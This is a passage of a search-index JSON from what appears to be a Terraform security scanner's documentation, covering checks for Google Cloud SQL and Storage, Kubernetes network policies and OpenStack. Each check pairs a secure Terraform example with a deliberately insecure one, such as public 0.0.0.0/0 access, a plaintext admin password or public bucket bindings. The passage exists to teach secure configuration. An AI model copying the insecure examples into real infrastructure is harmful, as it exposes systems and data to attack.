</ul>","title":"Links"},{"location":"checks/google/sql/no-public-access/","text":"","title":"Ensure that Cloud SQL Database Instances are not publicly exposed"},{"location":"checks/google/sql/no-public-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/sql/no-public-access/#explanation","text":"<p>Database instances should be configured so that they are not available over the public internet, but to internal compute resources which access them.</p>","title":"Explanation"},{"location":"checks/google/sql/no-public-access/#possible-impact","text":"<p>Public exposure of sensitive data</p>","title":"Possible Impact"},{"location":"checks/google/sql/no-public-access/#suggested-resolution","text":"<p>Remove public access from database instances</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/no-public-access/#insecure-example","text":"<p>The following example will fail the google-sql-no-public-access check. <pre><code> resource \"google_sql_database_instance\" \"postgres\" {\n    name             = \"postgres-instance-a\"\n    database_version = \"POSTGRES_11\"\n\n    settings {\n        tier = \"db-f1-micro\"\n\n        ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n                value           = \"108.12.12.0/24\"\n                name            = \"internal\"\n            }\n\n            authorized_networks {\n                value           = \"0.0.0.0/0\"\n                name            = \"internet\"\n            }\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/no-public-access/#secure-example","text":"<p>The following example will pass the google-sql-no-public-access check. <pre><code> resource \"google_sql_database_instance\" \"postgres\" {\n    name             = \"postgres-instance-a\"\n    database_version = \"POSTGRES_11\"\n\n    settings {\n        tier = \"db-f1-micro\"\n\n        ip_configuration {\n            ipv4_enabled = false\n            authorized_networks {\n                value           = \"10.0.0.1/24\"\n                name            = \"internal\"\n            }\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.cloudconformity.com/knowledge-base/gcp/CloudSQL/publicly-accessible-cloud-sql-instances.html</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-log-checkpoints/","text":"","title":"Ensure that logging of checkpoints is enabled."},{"location":"checks/google/sql/pg-log-checkpoints/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/pg-log-checkpoints/#explanation","text":"<p>Logging checkpoints provides useful diagnostic data, which can identify performance issues in an application and potential DoS vectors.</p>","title":"Explanation"},{"location":"checks/google/sql/pg-log-checkpoints/#possible-impact","text":"<p>Insufficient diagnostic data.</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-log-checkpoints/#suggested-resolution","text":"<p>Enable checkpoints logging.</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-log-checkpoints/#insecure-example","text":"<p>The following example will fail the google-sql-pg-log-checkpoints check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_checkpoints\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-log-checkpoints/#secure-example","text":"<p>The following example will pass the google-sql-pg-log-checkpoints check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_checkpoints\"\n            value = \"on\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-log-checkpoints/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CHECKPOINTS</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-log-connections/","text":"","title":"Ensure that logging of connections is enabled."},{"location":"checks/google/sql/pg-log-connections/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/pg-log-connections/#explanation","text":"<p>Logging connections provides useful diagnostic data such as session length, which can identify performance issues in an application and potential DoS vectors.</p>","title":"Explanation"},{"location":"checks/google/sql/pg-log-connections/#possible-impact","text":"<p>Insufficient diagnostic data.</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-log-connections/#suggested-resolution","text":"<p>Enable connection logging.</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-log-connections/#insecure-example","text":"<p>The following example will fail the google-sql-pg-log-connections check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_connections\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-log-connections/#secure-example","text":"<p>The following example will pass the google-sql-pg-log-connections check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_connections\"\n            value = \"on\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-log-connections/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-CONNECTIONS</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-log-disconnections/","text":"","title":"Ensure that logging of disconnections is enabled."},{"location":"checks/google/sql/pg-log-disconnections/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/pg-log-disconnections/#explanation","text":"<p>Logging disconnections provides useful diagnostic data such as session length, which can identify performance issues in an application and potential DoS vectors.</p>","title":"Explanation"},{"location":"checks/google/sql/pg-log-disconnections/#possible-impact","text":"<p>Insufficient diagnostic data.</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-log-disconnections/#suggested-resolution","text":"<p>Enable disconnection logging.</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-log-disconnections/#insecure-example","text":"<p>The following example will fail the google-sql-pg-log-disconnections check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_disconnections\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-log-disconnections/#secure-example","text":"<p>The following example will pass the google-sql-pg-log-disconnections check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_disconnections\"\n            value = \"on\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-log-disconnections/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-DISCONNECTIONS</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-log-errors/","text":"","title":"Ensure that Postgres errors are logged"},{"location":"checks/google/sql/pg-log-errors/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/sql/pg-log-errors/#explanation","text":"<p>Setting the minimum log severity too high will cause errors not to be logged</p>","title":"Explanation"},{"location":"checks/google/sql/pg-log-errors/#possible-impact","text":"<p>Loss of error logging</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-log-errors/#suggested-resolution","text":"<p>Set the minimum log severity to at least ERROR</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-log-errors/#insecure-example","text":"<p>The following example will fail the google-sql-pg-log-errors check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_min_messages\"\n            value = \"PANIC\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-log-errors/#secure-example","text":"<p>The following example will pass the google-sql-pg-log-errors check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_min_messages\"\n            value = \"WARNING\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-log-errors/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://postgresqlco.nf/doc/en/param/log_min_messages/</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-MESSAGES</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-log-lock-waits/","text":"","title":"Ensure that logging of lock waits is enabled."},{"location":"checks/google/sql/pg-log-lock-waits/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/sql/pg-log-lock-waits/#explanation","text":"<p>Lock waits are often an indication of poor performance and often an indicator of a potential denial of service vulnerability, therefore occurrences should be logged for analysis.</p>","title":"Explanation"},{"location":"checks/google/sql/pg-log-lock-waits/#possible-impact","text":"<p>Issues leading to denial of service may not be identified.</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-log-lock-waits/#suggested-resolution","text":"<p>Enable lock wait logging.</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-log-lock-waits/#insecure-example","text":"<p>The following example will fail the google-sql-pg-log-lock-waits check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_lock_waits\"\n            value = \"off\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-log-lock-waits/#secure-example","text":"<p>The following example will pass the google-sql-pg-log-lock-waits check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_lock_waits\"\n            value = \"on\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-log-lock-waits/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-LOCK-WAITS</p> </li> </ul>","title":"Links"},{"location":"checks/google/sql/pg-no-min-statement-logging/","text":"","title":"Ensure that logging of long statements is disabled."},{"location":"checks/google/sql/pg-no-min-statement-logging/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/google/sql/pg-no-min-statement-logging/#explanation","text":"<p>Logging of statements which could contain sensitive data is not advised, therefore this setting should preclude all statements from being logged.</p>","title":"Explanation"},{"location":"checks/google/sql/pg-no-min-statement-logging/#possible-impact","text":"<p>Sensitive data could be exposed in the database logs.</p>","title":"Possible Impact"},{"location":"checks/google/sql/pg-no-min-statement-logging/#suggested-resolution","text":"<p>Disable minimum duration statement logging completely</p>","title":"Suggested Resolution"},{"location":"checks/google/sql/pg-no-min-statement-logging/#insecure-example","text":"<p>The following example will fail the google-sql-pg-no-min-statement-logging check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_min_duration_statement\"\n            value = \"99\"\n        }\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/sql/pg-no-min-statement-logging/#secure-example","text":"<p>The following example will pass the google-sql-pg-no-min-statement-logging check. <pre><code> resource \"google_sql_database_instance\" \"db\" {\n    name             = \"db\"\n    database_version = \"POSTGRES_12\"\n    region           = \"us-central1\"\n    settings {\n        database_flags {\n            name  = \"log_min_duration_statement\"\n            value = \"-1\"\n        }\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/sql/pg-no-min-statement-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/sql_database_instance</p> </li> <li> <p>https://www.postgresql.org/docs/13/runtime-config-logging.html#GUC-LOG-MIN-DURATION-STATEMENT</p> </li> </ul>","title":"Links"},{"location":"checks/google/storage/","text":"","title":"storage"},{"location":"checks/google/storage/#checks","text":"<ul> <li> <p>enable-ubla Ensure that Cloud Storage buckets have uniform bucket-level access enabled</p> </li> <li> <p>no-public-access Ensure that Cloud Storage bucket is not anonymously or publicly accessible.</p> </li> </ul>","title":"Checks"},{"location":"checks/google/storage/enable-ubla/","text":"","title":"Ensure that Cloud Storage buckets have uniform bucket-level access enabled"},{"location":"checks/google/storage/enable-ubla/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/google/storage/enable-ubla/#explanation","text":"<p>When you enable uniform bucket-level access on a bucket, Access Control Lists (ACLs) are disabled, and only bucket-level Identity and Access Management (IAM) permissions grant access to that bucket and the objects it contains. You revoke all access granted by object ACLs and the ability to administrate permissions using bucket ACLs.</p>","title":"Explanation"},{"location":"checks/google/storage/enable-ubla/#possible-impact","text":"<p>ACLs are difficult to manage and often lead to incorrect/unintended configurations.</p>","title":"Possible Impact"},{"location":"checks/google/storage/enable-ubla/#suggested-resolution","text":"<p>Enable uniform bucket level access to provide a uniform permissioning system.</p>","title":"Suggested Resolution"},{"location":"checks/google/storage/enable-ubla/#insecure-example","text":"<p>The following example will fail the google-storage-enable-ubla check. <pre><code> resource \"google_storage_bucket\" \"static-site\" {\n    name          = \"image-store.com\"\n    location      = \"EU\"\n    force_destroy = true\n\n    uniform_bucket_level_access = false\n\n    website {\n        main_page_suffix = \"index.html\"\n        not_found_page   = \"404.html\"\n    }\n    cors {\n        origin          = [\"http://image-store.com\"]\n        method          = [\"GET\", \"HEAD\", \"PUT\", \"POST\", \"DELETE\"]\n        response_header = [\"*\"]\n        max_age_seconds = 3600\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/storage/enable-ubla/#secure-example","text":"<p>The following example will pass the google-storage-enable-ubla check. <pre><code> resource \"google_storage_bucket\" \"static-site\" {\n    name          = \"image-store.com\"\n    location      = \"EU\"\n    force_destroy = true\n\n    uniform_bucket_level_access = true\n\n    website {\n        main_page_suffix = \"index.html\"\n        not_found_page   = \"404.html\"\n    }\n    cors {\n        origin          = [\"http://image-store.com\"]\n        method          = [\"GET\", \"HEAD\", \"PUT\", \"POST\", \"DELETE\"]\n        response_header = [\"*\"]\n        max_age_seconds = 3600\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/storage/enable-ubla/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket#uniform_bucket_level_access</p> </li> <li> <p>https://cloud.google.com/storage/docs/uniform-bucket-level-access</p> </li> <li> <p>https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b</p> </li> </ul>","title":"Links"},{"location":"checks/google/storage/no-public-access/","text":"","title":"Ensure that Cloud Storage bucket is not anonymously or publicly accessible."},{"location":"checks/google/storage/no-public-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/google/storage/no-public-access/#explanation","text":"<p>Using 'allUsers' or 'allAuthenticatedUsers' as members in an IAM member/binding causes data to be exposed outside of the organisation.</p>","title":"Explanation"},{"location":"checks/google/storage/no-public-access/#possible-impact","text":"<p>Public exposure of sensitive data.</p>","title":"Possible Impact"},{"location":"checks/google/storage/no-public-access/#suggested-resolution","text":"<p>Restrict public access to the bucket.</p>","title":"Suggested Resolution"},{"location":"checks/google/storage/no-public-access/#insecure-example","text":"<p>The following example will fail the google-storage-no-public-access check. <pre><code> resource \"google_storage_bucket_iam_binding\" \"binding\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    members = [\n        \"allAuthenticatedUsers\",\n    ]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/google/storage/no-public-access/#secure-example","text":"<p>The following example will pass the google-storage-no-public-access check. <pre><code> resource \"google_storage_bucket_iam_binding\" \"binding\" {\n    bucket = google_storage_bucket.default.name\n    role = \"roles/storage.admin\"\n    members = [\n        \"user:jane@example.com\",\n    ]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/google/storage/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/storage_bucket_iam#member/members</p> </li> <li> <p>https://jbrojbrojbro.medium.com/you-make-the-rules-with-authentication-controls-for-cloud-storage-53c32543747b</p> </li> </ul>","title":"Links"},{"location":"checks/kubernetes/","text":"","title":"kubernetes"},{"location":"checks/kubernetes/#services","text":"<ul> <li>network</li> </ul>","title":"Services"},{"location":"checks/kubernetes/network/","text":"","title":"network"},{"location":"checks/kubernetes/network/#checks","text":"<ul> <li> <p>no-public-egress Public egress should not be allowed via network policies</p> </li> <li> <p>no-public-ingress Public ingress should not be allowed via network policies</p> </li> </ul>","title":"Checks"},{"location":"checks/kubernetes/network/no-public-egress/","text":"","title":"Public egress should not be allowed via network policies"},{"location":"checks/kubernetes/network/no-public-egress/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/kubernetes/network/no-public-egress/#explanation","text":"<p>You should not expose infrastructure to the public internet except where explicitly required</p>","title":"Explanation"},{"location":"checks/kubernetes/network/no-public-egress/#possible-impact","text":"<p>Exfiltration of data to the public internet</p>","title":"Possible Impact"},{"location":"checks/kubernetes/network/no-public-egress/#suggested-resolution","text":"<p>Remove public access except where explicitly required</p>","title":"Suggested Resolution"},{"location":"checks/kubernetes/network/no-public-egress/#insecure-example","text":"<p>The following example will fail the kubernetes-network-no-public-egress check. <pre><code> resource \"kubernetes_network_policy\" \"bad_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n\n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n\n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/kubernetes/network/no-public-egress/#secure-example","text":"<p>The following example will pass the kubernetes-network-no-public-egress check. <pre><code> resource \"kubernetes_network_policy\" \"good_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n\n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n\n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       to {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/kubernetes/network/no-public-egress/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr</li> </ul>","title":"Links"},{"location":"checks/kubernetes/network/no-public-ingress/","text":"","title":"Public ingress should not be allowed via network policies"},{"location":"checks/kubernetes/network/no-public-ingress/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/kubernetes/network/no-public-ingress/#explanation","text":"<p>You should not expose infrastructure to the public internet except where explicitly required</p>","title":"Explanation"},{"location":"checks/kubernetes/network/no-public-ingress/#possible-impact","text":"<p>Exposure of infrastructure to the public internet</p>","title":"Possible Impact"},{"location":"checks/kubernetes/network/no-public-ingress/#suggested-resolution","text":"<p>Remove public access except where explicitly required</p>","title":"Suggested Resolution"},{"location":"checks/kubernetes/network/no-public-ingress/#insecure-example","text":"<p>The following example will fail the kubernetes-network-no-public-ingress check. <pre><code> resource \"kubernetes_network_policy\" \"bad_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n\n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n\n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       from {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/kubernetes/network/no-public-ingress/#secure-example","text":"<p>The following example will pass the kubernetes-network-no-public-ingress check. <pre><code> resource \"kubernetes_network_policy\" \"good_example\" {\n   metadata {\n     name      = \"terraform-example-network-policy\"\n     namespace = \"default\"\n   }\n\n   spec {\n     pod_selector {\n       match_expressions {\n         key      = \"name\"\n         operator = \"In\"\n         values   = [\"webfront\", \"api\"]\n       }\n     }\n\n     ingress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       from {\n         ip_block {\n           cidr = \"10.0.0.0/16\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     egress {\n       ports {\n         port     = \"http\"\n         protocol = \"TCP\"\n       }\n       ports {\n         port     = \"8125\"\n         protocol = \"UDP\"\n       }\n\n       to {\n         ip_block {\n           cidr = \"0.0.0.0/0\"\n           except = [\n             \"10.0.0.0/24\",\n             \"10.0.1.0/24\",\n           ]\n         }\n       }\n     }\n\n     policy_types = [\"Ingress\", \"Egress\"]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/kubernetes/network/no-public-ingress/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/kubernetes/latest/docs/resources/network_policy#spec.ingress.from.ip_block.cidr</li> </ul>","title":"Links"},{"location":"checks/openstack/","text":"","title":"openstack"},{"location":"checks/openstack/#services","text":"<ul> <li> <p>compute</p> </li> <li> <p>networking</p> </li> </ul>","title":"Services"},{"location":"checks/openstack/compute/","text":"","title":"compute"},{"location":"checks/openstack/compute/#checks","text":"<ul> <li> <p>no-plaintext-password No plaintext password for compute instance</p> </li> <li> <p>no-public-access A firewall rule allows traffic from/to the public internet</p> </li> </ul>","title":"Checks"},{"location":"checks/openstack/compute/no-plaintext-password/","text":"","title":"No plaintext password for compute instance"},{"location":"checks/openstack/compute/no-plaintext-password/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/openstack/compute/no-plaintext-password/#explanation","text":"<p>Assigning a password to the compute instance using plaintext could lead to compromise; it would be preferable to use key-pairs as a login mechanism</p>","title":"Explanation"},{"location":"checks/openstack/compute/no-plaintext-password/#possible-impact","text":"<p>Including a plaintext password could lead to compromised instance</p>","title":"Possible Impact"},{"location":"checks/openstack/compute/no-plaintext-password/#suggested-resolution","text":"<p>Do not use plaintext passwords in terraform files</p>","title":"Suggested Resolution"},{"location":"checks/openstack/compute/no-plaintext-password/#insecure-example","text":"<p>The following example will fail the openstack-compute-no-plaintext-password check. <pre><code> resource \"openstack_compute_instance_v2\" \"bad_example\" {\n   name            = \"basic\"\n   image_id        = \"ad091b52-742f-469e-8f3c-fd81cadf0743\"\n   flavor_id       = \"3\"\n   admin_pass      = \"N0tSoS3cretP4ssw0rd\"\n   security_groups = [\"default\"]\n   user_data       = \"#cloud-config\\nhostname: instance_1.example.com\\nfqdn: instance_1.example.com\"\n\n   network {\n     name = \"my_network\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/openstack/compute/no-plaintext-password/#secure-example","text":"<p>The following example will pass the openstack-compute-no-plaintext-password check. <pre><code> resource \"openstack_compute_instance_v2\" \"good_example\" {\n   name            = \"basic\"\n   image_id        = \"ad091b52-742f-469e-8f3c-fd81cadf0743\"\n   flavor_id       = \"3\"\n   key_pair        = \"my_key_pair_name\"\n   security_groups = [\"default\"]\n   user_data       = \"#cloud-config\\nhostname: instance_1.example.com\\nfqdn: instance_1.example.com\"\n\n   network {\n     name = \"my_network\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/openstack/compute/no-plaintext-password/#links","text":"<ul> <li>https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/compute_instance_v2#admin_pass</li> </ul>","title":"Links"},{"location":"checks/openstack/compute/no-public-access/","text":"","title":"A firewall rule allows traffic from/to the public internet"},{"location":"checks/openstack/compute/no-public-access/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/openstack/compute/no-public-access/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/openstack/compute/no-public-access/#possible-impact","text":"<p>Exposure of infrastructure to the public internet</p>","title":"Possible Impact"},{"location":"checks/openstack/compute/no-public-access/#suggested-resolution","text":"<p>Employ more restrictive firewall rules</p>","title":"Suggested Resolution"},{"location":"checks/openstack/compute/no-public-access/#insecure-example","text":"<p>The following example will fail the openstack-compute-no-public-access check. <pre><code> resource \"openstack_fw_rule_v1\" \"rule_1\" {\n    name             = \"my_rule\"\n    description      = \"let anyone in\"\n    action           = \"allow\"\n    protocol         = \"tcp\"\n    destination_port = \"22\"\n    enabled          = \"true\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/openstack/compute/no-public-access/#secure-example","text":"<p>The following example will pass the openstack-compute-no-public-access check. <pre><code> resource \"openstack_fw_rule_v1\" \"rule_1\" {\n    name                   = \"my_rule\"\n    description            = \"don't let just anyone in\"\n    action                 = \"allow\"\n    protocol               = \"tcp\"\n    destination_ip_address = \"10.10.10.1\"\n    source_ip_address      = \"10.10.10.2\"\n    destination_port       = \"22\"\n    enabled                = \"true\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/openstack/compute/no-public-access/#links","text":"<ul> <li>https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1</li> </ul>","title":"Links"},{"location":"checks/openstack/networking/","text":"","title":"networking"},{"location":"checks/openstack/networking/#checks","text":"<ul> <li> <p>describe-security-group Missing description for security group.</p> </li> <li> <p>no-public-egress A security group rule allows egress traffic to multiple public addresses</p> </li> <li> <p>no-public-ingress A security group rule allows ingress traffic from multiple public addresses</p> </li> </ul>","title":"Checks"},{"location":"checks/openstack/networking/describe-security-group/","text":"","title":"Missing description for security group."},{"location":"checks/openstack/networking/describe-security-group/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/openstack/networking/describe-security-group/#explanation","text":"<p>Security groups should include a description for auditing purposes. Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/openstack/networking/describe-security-group/#possible-impact","text":"<p>Auditing capability and awareness limited.</p>","title":"Possible Impact"},{"location":"checks/openstack/networking/describe-security-group/#suggested-resolution","text":"<p>Add descriptions for all security groups</p>","title":"Suggested Resolution"},{"location":"checks/openstack/networking/describe-security-group/#insecure-example","text":"<p>The following example will fail the openstack-networking-describe-security-group check. <pre><code> resource \"openstack_networking_secgroup_v2\" \"group_1\" {\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/openstack/networking/describe-security-group/#secure-example","text":"<p>The following example will pass the openstack-networking-describe-security-group check. <pre><code> resource \"openstack_networking_secgroup_v2\" \"group_1\" {\n    description            = \"don't let just anyone in\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/openstack/networking/no-public-egress/","text":"","title":"A security group rule allows egress traffic to multiple public addresses"},{"location":"checks/openstack/networking/no-public-egress/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/openstack/networking/no-public-egress/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/openstack/networking/no-public-egress/#possible-impact","text":"<p>Potential exfiltration of data to the public internet</p>","title":"Possible 